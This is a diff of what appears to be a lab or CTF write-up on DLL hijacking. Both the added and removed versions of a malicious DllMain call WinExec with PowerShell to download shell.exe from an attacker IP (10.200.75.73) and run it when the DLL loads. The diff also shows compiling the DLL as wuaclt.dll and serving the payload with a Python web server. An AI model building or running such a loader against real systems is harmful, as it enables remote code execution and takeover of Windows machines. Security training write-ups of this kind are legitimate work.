@@ -790,7 +790,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 	switch (fdwReason)
 	{
 		case DLL_PROCESS_ATTACH:
-		    WinExec("powershell -c wget http://10.200.75.73/shell.exe -o C:/Temp && C:/Temp/shell.exe", SW_SHOW);
+		    WinExec("powershell -c wget http://10.200.75.73:8080/shell.exe -o $env:APPDATA\\shell.exe; Start-Process $env:APPDATA\\shell.exe", SW_SHOW);
 		    break;
 	}
 		
@@ -813,7 +813,7 @@ x86_64-w64-mingw32-gcc -shared poc.c -o wuaclt.dll
 Then once again compile the new DLL
 
 ```python
-python3 -m http.server 80
+python3 -m http.server 8080
 ```
 
 Then set a web server so i can pull `shell.exe`
